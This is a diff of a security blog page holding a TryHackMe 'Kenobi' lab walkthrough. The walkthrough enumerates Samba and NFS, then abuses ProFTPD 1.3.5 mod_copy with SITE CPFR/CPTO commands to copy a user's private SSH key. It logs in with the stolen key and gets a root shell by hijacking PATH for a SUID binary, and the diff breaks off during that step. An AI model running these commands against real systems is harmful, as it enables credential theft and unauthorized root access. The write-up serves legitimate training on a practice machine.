@@ -3,7 +3,7 @@
   <head>
     <title>TryHackMe - Kenobi // FelSec - Blog</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.75.1" />
+    <meta name="generator" content="Hugo 0.105.0">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="FelSec" />
     <meta name="description" content="" />
@@ -22,7 +22,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
-
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="TryHackMe - Kenobi"/>
 <meta name="twitter:description" content="Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation."/>
@@ -30,9 +29,10 @@ if (!doNotTrack) {
     <meta property="og:title" content="TryHackMe - Kenobi" />
 <meta property="og:description" content="Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://felsec.com/posts/tryhackme-kenobi/" />
+<meta property="og:url" content="https://felsec.com/posts/tryhackme-kenobi/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-06-26T17:38:44+01:00" />
 <meta property="article:modified_time" content="2020-06-26T17:38:44+01:00" />
+
 
 
   </head>
@@ -101,7 +101,7 @@ if (!doNotTrack) {
 <h2 id="information-gathering">Information Gathering</h2>
 <p>After entering the room, spinning up the machine and getting the host&rsquo;s IP address (10.10.93.191 for me); the first task is to scan the host to determine what ports and services are being presented to us.</p>
 <p>This can be done with the following command:</p>
-<pre><code>nmap -Pn -sS -sV -iL host -oN kenobi.nmap
+<pre tabindex="0"><code>nmap -Pn -sS -sV -iL host -oN kenobi.nmap
 </code></pre><p>Let&rsquo;s break this command down:</p>
 <ul>
 <li>-Pn tells nmap to assume the host is up;</li>
@@ -111,7 +111,7 @@ if (!doNotTrack) {
 <li>and, -oN tells nmap to output the results to a (Normal text output)</li>
 </ul>
 <p>This results in the following output:</p>
-<pre><code>Host is up (0.021s latency).
+<pre tabindex="0"><code>Host is up (0.021s latency).
 Not shown: 993 closed ports
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         ProFTPD 1.3.5
@@ -148,9 +148,9 @@ Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 </ol>
 <h4 id="nmap">nmap</h4>
 <p>We can do this by running the following command:</p>
-<pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -iL host -oN SMB-Shares.nmap
+<pre tabindex="0"><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -iL host -oN SMB-Shares.nmap
 </code></pre><p>This results in the following output:</p>
-<pre><code>Host is up (0.019s latency).
+<pre tabindex="0"><code>Host is up (0.019s latency).
 
 PORT    STATE SERVICE
 445/tcp open  microsoft-ds
@@ -184,7 +184,7 @@ Host script results:
 |_    Current user access: &lt;none&gt;
 </code></pre><h4 id="enum4linux">enum4linux</h4>
 <p>An alternative method is to use the tool enum4linux. This tool can take longer to run than nmap, however it can be used to return more information:</p>
-<pre><code>enum4linux -a 10.10.93.191
+<pre tabindex="0"><code>enum4linux -a 10.10.93.191
 
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jun 11 18:13:13 2020
 
@@ -193,8 +193,8 @@ Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux
  ==========================
 Target ........... 10.10.93.191
 RID Range ........ 500-550,1000-1050
-Username ......... ''
-Password ......... ''
+Username ......... &#39;&#39;
+Password ......... &#39;&#39;
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
 
@@ -220,7 +220,7 @@ Looking up status of 10.10.93.191
  =====================================
 |    Session Check on 10.10.93.191    |
  =====================================
-[+] Server 10.10.93.191 allows sessions using username '', password ''
+[+] Server 10.10.93.191 allows sessions using username &#39;&#39;, password &#39;&#39;
 
  ===========================================
 |    Getting domain SID for 10.10.93.191    |
@@ -228,7 +228,7 @@ Looking up status of 10.10.93.191
 mkdir failed on directory /var/run/samba/msg.lock: Permission denied
 Domain Name: WORKGROUP
 Domain Sid: (NULL SID)
-[+] Can't determine if host is part of domain or part of a workgroup
+[+] Can&#39;t determine if host is part of domain or part of a workgroup
 
  ======================================
 |    OS information on 10.10.93.191    |
@@ -249,7 +249,7 @@ mkdir failed on directory /var/run/samba/msg.lock: Permission denied
  =========================================
 |    Share Enumeration on 10.10.93.191    |
  =========================================
-WARNING: The &quot;syslog&quot; option is deprecated
+WARNING: The &#34;syslog&#34; option is deprecated
 
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -268,14 +268,14 @@ Reconnecting with SMB1 for workgroup listing.
 [+] Attempting to map shares on 10.10.93.191
 //10.10.93.191/print$	Mapping: DENIED, Listing: N/A
 //10.10.93.191/anonymous	Mapping: OK, Listing: OK
-//10.10.93.191/IPC$	[E] Can't understand response:
-WARNING: The &quot;syslog&quot; option is deprecated
+//10.10.93.191/IPC$	[E] Can&#39;t understand response:
+WARNING: The &#34;syslog&#34; option is deprecated
 NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 
  ====================================================
 |    Password Policy Information for 10.10.93.191    |
  ====================================================
-[E] Dependent program &quot;polenum.py&quot; not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/
+[E] Dependent program &#34;polenum.py&#34; not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/
 
  ==============================
 |    Groups on 10.10.93.191    |
@@ -304,11 +304,11 @@ enum4linux complete on Thu Jun 11 18:13:18 2020
 <h4 id="browsing-the-smb-share">Browsing the SMB share</h4>
 <p>As we can see from both sets of output the server has 3 open shares. Two are default shares and not overly interesting, but one of them (anonymous) is very interesting.</p>
 <p>Let&rsquo;s connect to the anonymous share and start digging:</p>
-<pre><code>smbclient //10.10.245.98/anonymous
+<pre tabindex="0"><code>smbclient //10.10.245.98/anonymous
 </code></pre><p>After connecting we can use the <code>dir</code> command to print out a list of files and directories.</p>
-<pre><code>$ smbclient //10.10.93.191/anonymous
-Enter WORKGROUP\felsec's password:
-Try &quot;help&quot; to get a list of possible commands.
+<pre tabindex="0"><code>$ smbclient //10.10.93.191/anonymous
+Enter WORKGROUP\felsec&#39;s password:
+Try &#34;help&#34; to get a list of possible commands.
 smb: \&gt; dir
   .                                   D        0  Wed Sep  4 11:49:09 2019
   ..                                  D        0  Wed Sep  4 11:56:07 2019
@@ -318,20 +318,20 @@ smb: \&gt; dir
 smb: \&gt;
 </code></pre><p>We can see that there is only one file stored on this share (log.txt), let&rsquo;s download it and look at the contents on our machine.</p>
 <p>To download the file via smbclient, we can use the <code>get</code> command:</p>
-<pre><code>smb: \&gt; get log.txt
+<pre tabindex="0"><code>smb: \&gt; get log.txt
 </code></pre><p>If there were more files and/or folders we could use <code>smbget</code> to recursively download all items:</p>
-<pre><code>smbget -R smb://10.10.93.191/anonymous
+<pre tabindex="0"><code>smbget -R smb://10.10.93.191/anonymous
 </code></pre><p>Looking at the contents of the log.txt file we find that the FTP service is running as the Kenobi user (useful information for later!), and some SSH keys have been generated for the Kenobi user and stored in the default location. We are also able to see the location of the anonymous share on the server.</p>
-<pre><code>Generating public/private rsa key pair.
+<pre tabindex="0"><code>Generating public/private rsa key pair.
 Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
-Created directory '/home/kenobi/.ssh'.
+Created directory &#39;/home/kenobi/.ssh&#39;.
 Enter passphrase (empty for no passphrase):
 Enter same passphrase again:
 Your identification has been saved in /home/kenobi/.ssh/id_rsa.
 Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
 The key fingerprint is:
 SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
-The key's randomart image is:
+The key&#39;s randomart image is:
 +---[RSA 2048]----+
 |                 |
 |           ..    |
@@ -345,11 +345,11 @@ The key's randomart image is:
 +----[SHA256]-----+
 
 # This is a basic ProFTPD configuration file (rename it to
-# 'proftpd.conf' for actual use.  It establishes a single server
+# &#39;proftpd.conf&#39; for actual use.  It establishes a single server
 # and a single anonymous login.  It assumes that you have a user/group
-# &quot;nobody&quot; and &quot;ftp&quot; for normal operation and anon.
+# &#34;nobody&#34; and &#34;ftp&#34; for normal operation and anon.
 
-ServerName			&quot;ProFTPD Default Installation&quot;
+ServerName			&#34;ProFTPD Default Installation&#34;
 ServerType			standalone
 DefaultServer			on
 ...
@@ -371,13 +371,13 @@ Group				kenobi
 <h4 id="scanning">Scanning</h4>
 <p>Let&rsquo;s try and get some more information about the rpcbind service using a couple of tools (nmap and showmount).</p>
 <p>We can use showmount to view the mounted volumes attached to the network files system being presented by the rpcbind service:</p>
-<pre><code>showmount -e 10.10.93.191
+<pre tabindex="0"><code>showmount -e 10.10.93.191
 
 $ showmount -e 10.10.93.191
 Export list for 10.10.93.191:
 /var *
 </code></pre><p>If we want to gather more information about the volumes we can run an nmap scan:</p>
-<pre><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.93.191
+<pre tabindex="0"><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.93.191
 
 Host is up (0.018s latency).
 
@@ -405,14 +405,14 @@ PORT    STATE SERVICE
 </code></pre><h3 id="ftp">FTP</h3>
 <p>Looking at our nmap output from earlier we know that the server is running a ProFTPD 1.3.5 instance.</p>
 <p>We can find all vulnerabilities affecting this version of ProFTPD by either using the <code>searchsploit</code> command or the <a href="https://www.exploit-db.com/">Exploit-DB website</a>.</p>
-<pre><code>$ searchsploit ProFTPd 1.3.5
+<pre tabindex="0"><code>$ searchsploit ProFTPd 1.3.5
 
 ------------------------------------------------------------------------ -------------------------------------
  Exploit Title                                                          |  Path
                                                                         | (/root/tools/exploitdb/)
 ------------------------------------------------------------------------ -------------------------------------
-ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)               | exploits/linux/remote/37262.rb
-ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                     | exploits/linux/remote/36803.py
+ProFTPd 1.3.5 - &#39;mod_copy&#39; Command Execution (Metasploit)               | exploits/linux/remote/37262.rb
+ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution                     | exploits/linux/remote/36803.py
 ProFTPd 1.3.5 - File Copy                                               | exploits/linux/remote/36742.txt
 ------------------------------------------------------------------------ -------------------------------------
 </code></pre><p>We can see that Exploit DB reports 3 vulnerabilities for our version of ProFTPD, however they are all actually the same vulnerability - CVE-2015-3306.</p>
@@ -431,7 +431,7 @@ ProFTPd 1.3.5 - File Copy                                               | exploi
 <h3 id="method-1---via-nfs">Method 1 - via NFS</h3>
 <p>Using the rpcbind information we found earlier we should be able to mount the /var direcroty of the remote host to our machine to retrieve this file and give us further access to the server.</p>
 <p>Firstly, we need to create the temporary mount point and mount the remote directory:</p>
-<pre><code>$ sudo mkdir /mnt/kenobiNFS
+<pre tabindex="0"><code>$ sudo mkdir /mnt/kenobiNFS
 $ sudo mount 10.10.93.191:/var /mnt/kenobiNFS
 $ ls -la /mnt/kenobiNFS
 total 48
@@ -450,20 +450,20 @@ drwxr-xr-x  5 root root   4096 Sep  4  2019 spool
 drwxrwxrwt  6 root root   4096 Jun 11 18:41 tmp
 drwxr-xr-x  3 root root   4096 Sep  4  2019 www
 </code></pre><p>Next we need to copy the SSH key to the /var/tmp directory:</p>
-<pre><code>$ nc 10.10.93.191 21
+<pre tabindex="0"><code>$ nc 10.10.93.191 21
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.191]
 SITE CPFR /home/kenobi/.ssh/id_rsa
 350 File or directory exists, ready for destination name
 SITE CPTO /var/tmp/id_rsa
 250 Copy successful
 </code></pre><p>We can now copy the SSH key to another location on our system and access the server:</p>
-<pre><code>$ cp cp /mnt/kenobiNFS/tmp/id_rsa ~/loot/kenobi-id_rsa
+<pre tabindex="0"><code>$ cp cp /mnt/kenobiNFS/tmp/id_rsa ~/loot/kenobi-id_rsa
 $ chmod 600 ~/loot/kenobi-id_rsa
 $ ssh -i ~/loot/kenobi-id_rsa kenobi@10.10.93.191
-The authenticity of host '10.10.93.191 (10.10.93.191)' can't be established.
+The authenticity of host &#39;10.10.93.191 (10.10.93.191)&#39; can&#39;t be established.
 ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
 Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '10.10.93.191' (ECDSA) to the list of known hosts.
+Warning: Permanently added &#39;10.10.93.191&#39; (ECDSA) to the list of known hosts.
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -475,13 +475,13 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
 
 
 Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
-See &quot;man sudo_root&quot; for details.
+To run a command as administrator (user &#34;root&#34;), use &#34;sudo &lt;command&gt;&#34;.
+See &#34;man sudo_root&#34; for details.
 
 kenobi@kenobi:~$
 </code></pre><h3 id="method-2---via-anonymous-share">Method 2 - via anonymous share</h3>
 <p>From looking at the log file we know that the anonymous share is being presented from the Kenobi user&rsquo;s home directory <code>/home/kenobi/share</code>. This gives us a location that we are able to copy files to and can access and download files from.</p>
-<pre><code>$ nc 10.10.93.191 21
+<pre tabindex="0"><code>$ nc 10.10.93.191 21
 
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.191]
 SITE CPFR /home/kenobi/.ssh/id_rsa
@@ -490,9 +490,9 @@ SITE CPTO /home/kenobi/share/id_rsa
 250 Copy successful
 
 $ smbclient //10.10.93.191/anonymous
-WARNING: The &quot;syslog&quot; option is deprecated
-Enter WORKGROUP\felsec's password:
-Try &quot;help&quot; to get a list of possible commands.
+WARNING: The &#34;syslog&#34; option is deprecated
+Enter WORKGROUP\felsec&#39;s password:
+Try &#34;help&#34; to get a list of possible commands.
 smb: \&gt; dir
   .                                   D        0  Thu Jun 11 19:09:12 2020
   ..                                  D        0  Thu Jun 11 19:02:28 2020
@@ -505,7 +505,7 @@ getting file \id_rsa of size 1675 as id_rsa (21.0 KiloBytes/sec) (average 21.0 K
 smb: \&gt; exit
 </code></pre><p>Now we have the SSH key, we need to give it the correct permissions before we can use it <code>chmod 600 id_rsa</code>.</p>
 <p>We can now access the server using the SSH key:</p>
-<pre><code>$ ssh -i id_rsa kenobi@10.10.93.191
+<pre tabindex="0"><code>$ ssh -i id_rsa kenobi@10.10.93.191
 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
 
@@ -518,8 +518,8 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
 
 
 Last login: Thu Jun 11 12:46:10 2020 from 10.8.7.19
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
-See &quot;man sudo_root&quot; for details.
+To run a command as administrator (user &#34;root&#34;), use &#34;sudo &lt;command&gt;&#34;.
+See &#34;man sudo_root&#34; for details.
 
 kenobi@kenobi:~$
 </code></pre><p>Now we have access to the server we can obtain the user flag, and start looking towards elevating our privileges to root.</p>
@@ -527,9 +527,9 @@ kenobi@kenobi:~$
 <p>There are a few common ways to elevate a user&rsquo;s privileges on a Linux system, with one of the main ones being the exploitation of programs with the SUID or SGID bits set.</p>
 <p>SUID (Set owner User ID up on execution) is a special type of file permissions given to a file that allows the file to be executed with the permissions of the file owner. This is usually reserved for special files with specific purposes (for example, passwd), however in some cases other executes will be given this permission that can then be used to give a user elevated privileges. Some examples and further information can be found here: <a href="https://www.slashroot.in/suid-and-sgid-linux-explained-examples">https://www.slashroot.in/suid-and-sgid-linux-explained-examples</a></p>
 <p>The following one liner can be used to find all files with the SUID bit set:</p>
-<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
 </code></pre><p>Running this on the server gives us:</p>
-<pre><code>kenobi@kenobi:~$ find / -perm -u=s -type f 2&gt;/dev/null
+<pre tabindex="0"><code>kenobi@kenobi:~$ find / -perm -u=s -type f 2&gt;/dev/null
 /sbin/mount.nfs
 /usr/lib/policykit-1/polkit-agent-helper-1
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -555,7 +555,7 @@ kenobi@kenobi:~$
 /bin/su
 /bin/ping6
 </code></pre><p>The majority of these are default commands and required on the server, however there is one item <code>/usr/bin/menu</code> that stands out as different. Running this command presents us with a set of options:</p>
-<pre><code>kenobi@kenobi:~$ /usr/bin/menu
+<pre tabindex="0"><code>kenobi@kenobi:~$ /usr/bin/menu
 
 ***************************************
 1. status check
@@ -564,7 +564,7 @@ kenobi@kenobi:~$
 ** Enter your choice :
 </code></pre><p>When we choose an option we are presented with system output, suggesting that these options are running system commands with root privileges. Fantastic! Depending on how these commands are being called we may be able to intercept the calls.</p>
 <p>We can use the <code>strings</code> command to identify exactly what commands the program is running.</p>
-<pre><code>kenobi@kenobi:/tmp$ strings /usr/bin/menu | grep -v _
+<pre tabindex="0"><code>kenobi@kenobi:/tmp$ strings /usr/bin/menu | grep -v _
 ...
 ***************************************
 1. status check
@@ -576,12 +576,12 @@ uname -r
 ifconfig
 ...
 </code></pre><p>We can now see that the menu program is using relative calls for the curl, uname, and ifconfig programs. Relative calls make use of the user&rsquo;s <code>PATH</code> variable, which is open to exploitation as it is controlled by the user. The <code>PATH</code> variable defines the order of locations that the system will search when trying to run a program where the full path has not been specified. Let&rsquo;s start by taking a look at the Kenobi user&rsquo;s current <code>PATH</code> variable.</p>
-<pre><code>kenobi@kenobi:/tmp$ echo $PATH
+<pre tabindex="0"><code>kenobi@kenobi:/tmp$ echo $PATH
 /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 </code></pre><p>Perfect! We can see that the Kenobi user has two locations (/home/kenobi/bin and /home/kenobi/.local/bin/) that we can inject our malicious versions of curl, uname and/or ifconfig into. Alternatively, we can modify the PATH variable to include any directory we choose.</p>
 <p>Now we can use this information to try and get a root shell on the server. All three programs used by the menu program</p>
 <p>Option 1:</p>
-<pre><code>kenobi@kenobi:/tmp$ mkdir /home/kenobi/bin/
+<pre tabindex="0"><code>kenobi@kenobi:/tmp$ mkdir /home/kenobi/bin/
 kenobi@kenobi:/tmp$ echo /bin/sh &gt; /home/kenobi/bin/ifconfig
 kenobi@kenobi:/tmp$ chmod 777 /home/kenobi/bin/ifconfig
 kenobi@kenobi:/tmp$ /usr/bin/menu
@@ -595,7 +595,7 @@ kenobi@kenobi:/tmp$ /usr/bin/menu
 uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
 #
 </code></pre><p>Option 2:</p>
-<pre><code>kenobi@kenobi:/~$ cd /tmp
+<pre tabindex="0"><code>kenobi@kenobi:/~$ cd /tmp
 kenobi@kenobi:/tmp$ echo /bin/sh &gt; /tmp/curl
 kenobi@kenobi:/tmp$ chmod 777 /tmp/curl
 kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
